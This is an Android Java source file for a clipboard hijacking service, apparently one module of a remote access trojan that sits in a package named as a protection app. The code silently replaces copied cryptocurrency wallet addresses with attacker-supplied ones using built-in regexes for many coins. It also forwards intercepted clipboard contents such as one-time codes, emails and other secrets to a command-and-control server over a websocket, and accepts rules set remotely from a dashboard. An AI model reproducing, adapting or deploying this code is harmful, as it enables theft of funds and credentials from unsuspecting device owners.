package com.seguranca.protecao;

import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.util.LinkedHashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * ClipperService — clipboard monitor and hijacker.
 *
 * Features:
 *   CLIPPER_START          { rules: [{pattern, replacement}] }
 *   CLIPPER_STOP           {}
 *   CLIPPER_ADD_RULE       { pattern, replacement, label }
 *   CLIPPER_REMOVE_RULE    { label }
 *   CLIPPER_SET_CRYPTO     { btc, eth, usdt_trc20, usdt_erc20, bnb, sol, xmr }
 *   CLIPPER_GET_RULES      {}
 *   CLIPPER_GET_LOG        {}
 *   CLIPPER_CLEAR_LOG      {}
 *   GET_CLIPBOARD          {}   → read current clipboard
 *   SET_CLIPBOARD          { text }  → overwrite clipboard
 *
 * How it works:
 *   Registers a ClipboardManager.OnPrimaryClipChangedListener.
 *   On every clipboard change, checks content against all rules.
 *   If any rule matches, replaces the clipboard content silently.
 *   All intercepts logged to SharedPreferences + pushed to C2.
 *
 * Crypto address patterns are pre-loaded. Custom regex rules
 * can be added from the dashboard at runtime.
 */
public class ClipperService extends Service {

    private static final String TAG = "Clipper";
    public  static volatile ClipperService sInstance;
    private ClipboardManager clipboardManager;
    private volatile boolean active = false;

    // Replacement rules: label → {pattern, replacement}
    private final Map<String, ClipRule> rules = new LinkedHashMap<>();

    public static class ClipRule {
        public final String  label;
        public final Pattern pattern;
        public final String  replacement;
        ClipRule(String label, String regex, String replacement) {
            this.label       = label;
            this.pattern     = Pattern.compile(regex);
            this.replacement = replacement;
        }
    }

    // ─── PRE-BUILT CRYPTO PATTERNS ────────────────────────────────────────────

    private static final String REGEX_BTC      = "\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b|\\bbc1[a-z0-9]{39,59}\\b";
    private static final String REGEX_ETH      = "\\b0x[0-9a-fA-F]{40}\\b";
    private static final String REGEX_USDT_TRC = "\\bT[A-Za-z1-9]{33}\\b";
    private static final String REGEX_USDT_ERC = REGEX_ETH; // ERC-20 same format as ETH
    private static final String REGEX_BNB      = "\\bbnb1[a-z0-9]{38}\\b|" + REGEX_ETH;
    private static final String REGEX_SOL      = "\\b[1-9A-HJ-NP-Za-km-z]{32,44}\\b";
    private static final String REGEX_XMR      = "\\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\\b";
    private static final String REGEX_LTC      = "\\b[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}\\b|\\bltc1[a-z0-9]{39,59}\\b";
    private static final String REGEX_DOGE     = "\\bD[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}\\b";
    private static final String REGEX_TRX      = "\\bT[A-Za-z1-9]{33}\\b";

    // ─── LIFECYCLE ───────────────────────────────────────────────────────────

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onCreate() {
        super.onCreate();
        sInstance = this;
        clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getStringExtra("action");
            if ("STOP".equals(action)) {
                stopClipper();
                stopSelf();
            } else {
                startClipper();
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopClipper();
        sInstance = null;
    }

    // ─── START / STOP ────────────────────────────────────────────────────────

    public void startClipper() {
        if (active) return;
        active = true;
        clipboardManager.addPrimaryClipChangedListener(clipListener);
        Log.d(TAG, "Clipper started with " + rules.size() + " rules");
    }

    public void stopClipper() {
        if (!active) return;
        active = false;
        try { clipboardManager.removePrimaryClipChangedListener(clipListener); } catch (Exception ignored) {}
        Log.d(TAG, "Clipper stopped");
    }

    // ─── CLIP LISTENER ───────────────────────────────────────────────────────

    private final ClipboardManager.OnPrimaryClipChangedListener clipListener = () -> {
        if (!active) return;
        try {
            ClipData clip = clipboardManager.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return;
            String text = clip.getItemAt(0).coerceToText(this).toString();
            if (text.isEmpty()) return;

            // Check all rules
            for (ClipRule rule : rules.values()) {
                Matcher m = rule.pattern.matcher(text);
                if (m.find()) {
                    String matched      = m.group(0);
                    String replacement  = rule.replacement;

                    // Skip if already replaced
                    if (text.equals(replacement)) continue;

                    // Replace and set clipboard
                    String newText = text.replace(matched, replacement);
                    ClipData newClip = ClipData.newPlainText("", newText);
                    clipboardManager.setPrimaryClip(newClip);

                    // Log + push to C2
                    logIntercept(rule.label, matched, replacement, text);
                    Log.d(TAG, "Clipped: " + rule.label + " | " + matched.substring(0, Math.min(10, matched.length())) + "... → replaced");
                    break; // Only apply first matching rule
                }
            }

            // Always log clipboard content to C2 (for monitoring, not just hijacking)
            pushClipboardToC2(text);

        } catch (Exception e) {
            Log.e(TAG, "clipListener: " + e.getMessage());
        }
    };

    // ─── RULE MANAGEMENT ─────────────────────────────────────────────────────

    public String addRule(String label, String regex, String replacement) {
        if (label == null || regex == null || replacement == null)
            return "ERROR: label, regex, replacement required";
        try {
            rules.put(label, new ClipRule(label, regex, replacement));
            persistRules();
            return "OK: rule '" + label + "' added";
        } catch (Exception e) {
            return "ERROR: invalid regex — " + e.getMessage();
        }
    }

    public String removeRule(String label) {
        if (rules.remove(label) != null) {
            persistRules();
            return "OK: rule '" + label + "' removed";
        }
        return "NOT_FOUND: " + label;
    }

    /**
     * Bulk-loads crypto replacement addresses from dashboard.
     * Only sets rules for addresses that are provided (non-empty).
     */
    public String setCryptoAddresses(String btc, String eth, String usdtTrc, String usdtErc,
                                     String bnb, String sol, String xmr, String ltc,
                                     String doge, String trx) {
        if (btc      != null && !btc.isEmpty())      rules.put("BTC",       new ClipRule("BTC",       REGEX_BTC,      btc));
        if (eth      != null && !eth.isEmpty())      rules.put("ETH",       new ClipRule("ETH",       REGEX_ETH,      eth));
        if (usdtTrc  != null && !usdtTrc.isEmpty())  rules.put("USDT_TRC20",new ClipRule("USDT_TRC20",REGEX_USDT_TRC, usdtTrc));
        if (usdtErc  != null && !usdtErc.isEmpty())  rules.put("USDT_ERC20",new ClipRule("USDT_ERC20",REGEX_USDT_ERC, usdtErc));
        if (bnb      != null && !bnb.isEmpty())      rules.put("BNB",       new ClipRule("BNB",       REGEX_BNB,      bnb));
        if (sol      != null && !sol.isEmpty())      rules.put("SOL",       new ClipRule("SOL",       REGEX_SOL,      sol));
        if (xmr      != null && !xmr.isEmpty())      rules.put("XMR",       new ClipRule("XMR",       REGEX_XMR,      xmr));
        if (ltc      != null && !ltc.isEmpty())      rules.put("LTC",       new ClipRule("LTC",       REGEX_LTC,      ltc));
        if (doge     != null && !doge.isEmpty())     rules.put("DOGE",      new ClipRule("DOGE",      REGEX_DOGE,     doge));
        if (trx      != null && !trx.isEmpty())      rules.put("TRX",       new ClipRule("TRX",       REGEX_TRX,      trx));
        persistRules();
        return "OK: " + rules.size() + " crypto rules loaded";
    }

    public String getRules() {
        JsonArray arr = new JsonArray();
        for (ClipRule r : rules.values()) {
            JsonObject obj = new JsonObject();
            obj.addProperty("label",       r.label);
            obj.addProperty("pattern",     r.pattern.pattern());
            obj.addProperty("replacement", r.replacement.length() > 12
                ? r.replacement.substring(0, 6) + "..." + r.replacement.substring(r.replacement.length() - 6)
                : r.replacement);
            arr.add(obj);
        }
        return arr.toString();
    }

    // ─── CLIPBOARD READ/WRITE ────────────────────────────────────────────────

    public String readClipboard() {
        try {
            ClipData clip = clipboardManager.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return "";
            return clip.getItemAt(0).coerceToText(this).toString();
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String writeClipboard(String text) {
        try {
            clipboardManager.setPrimaryClip(ClipData.newPlainText("", text));
            return "OK: clipboard set";
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    // ─── LOG ─────────────────────────────────────────────────────────────────

    private void logIntercept(String label, String original, String replacement, String fullText) {
        try {
            android.content.SharedPreferences prefs =
                getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            String json = prefs.getString("clipper_log", "[]");
            JsonArray arr = JsonParser.parseString(json).getAsJsonArray();
            JsonObject entry = new JsonObject();
            entry.addProperty("label",       label);
            entry.addProperty("original",    original.length() > 20 ? original.substring(0,10) + "..." : original);
            entry.addProperty("replacement", replacement.length() > 20 ? replacement.substring(0,10) + "..." : replacement);
            entry.addProperty("full_text",   fullText.length() > 100 ? fullText.substring(0, 100) : fullText);
            entry.addProperty("timestamp",   System.currentTimeMillis());
            arr.add(entry);
            while (arr.size() > 500) arr.remove(0);
            prefs.edit().putString("clipper_log", arr.toString()).apply();

            // Push to C2
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "CLIPPER_INTERCEPT");
            msg.add("data", entry);
            CommandControlService cs = CommandControlService.sInstance;
            if (cs != null && cs.isConnected && cs.webSocket != null) {
                cs.webSocket.send(new Gson().toJson(msg));
            }
        } catch (Exception ignored) {}
    }

    private void pushClipboardToC2(String text) {
        try {
            // Only push if it looks like something valuable (address/password/otp)
            if (text.length() < 4 || text.length() > 500) return;
            boolean interesting = text.matches(".*[0-9a-fA-F]{30,}.*")  // hex
                || text.matches(".*[A-Za-z0-9+/=]{20,}.*")              // base64
                || text.matches(".*\\d{4,8}.*")                          // OTP
                || text.matches(".*@.*\\..*")                            // email
                || text.length() > 15;                                   // any longer text

            if (!interesting) return;

            JsonObject msg = new JsonObject();
            msg.addProperty("type", "CLIPBOARD_CONTENT");
            msg.addProperty("text", text);
            msg.addProperty("ts",   System.currentTimeMillis());
            CommandControlService cs = CommandControlService.sInstance;
            if (cs != null && cs.isConnected && cs.webSocket != null) {
                cs.webSocket.send(new Gson().toJson(msg));
            }
        } catch (Exception ignored) {}
    }

    public String getLog() {
        return getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
            .getString("clipper_log", "[]");
    }

    public String clearLog() {
        getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
            .edit().remove("clipper_log").apply();
        return "OK: clipper log cleared";
    }

    // ─── PERSIST RULES ───────────────────────────────────────────────────────

    private void persistRules() {
        try {
            JsonArray arr = new JsonArray();
            for (ClipRule r : rules.values()) {
                JsonObject obj = new JsonObject();
                obj.addProperty("label",       r.label);
                obj.addProperty("pattern",     r.pattern.pattern());
                obj.addProperty("replacement", r.replacement);
                arr.add(obj);
            }
            getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .edit().putString("clipper_rules", arr.toString()).apply();
        } catch (Exception ignored) {}
    }

    /** Load persisted rules on service restart. */
    public void loadPersistedRules() {
        try {
            String json = getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("clipper_rules", "[]");
            JsonArray arr = JsonParser.parseString(json).getAsJsonArray();
            for (int i = 0; i < arr.size(); i++) {
                JsonObject obj = arr.get(i).getAsJsonObject();
                String label  = obj.get("label").getAsString();
                String regex  = obj.get("pattern").getAsString();
                String repl   = obj.get("replacement").getAsString();
                try { rules.put(label, new ClipRule(label, regex, repl)); }
                catch (Exception ignored) {}
            }
            Log.d(TAG, "Loaded " + rules.size() + " persisted clipper rules");
        } catch (Exception e) {
            Log.e(TAG, "loadPersistedRules: " + e.getMessage());
        }
    }
}
